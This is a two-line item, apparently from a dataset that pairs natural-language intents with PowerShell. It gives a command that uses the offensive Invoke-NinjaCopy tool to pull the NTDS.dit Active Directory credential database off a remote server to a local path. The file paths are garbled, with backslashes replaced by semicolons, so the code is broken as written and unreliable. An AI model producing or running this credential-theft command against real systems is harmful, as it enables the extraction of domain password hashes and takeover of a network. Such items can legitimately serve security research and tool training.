# Natural language intent:
# Use NinjaCopy to copy the NTDS.dit file from a remote server to a local destination.

$NtdsBytes = Invoke-NinjaCopy -Path 'C:\windows;tds;tds.dit' -ComputerName 'Server1' -LocalDestination 'c:\test;tds.dit'
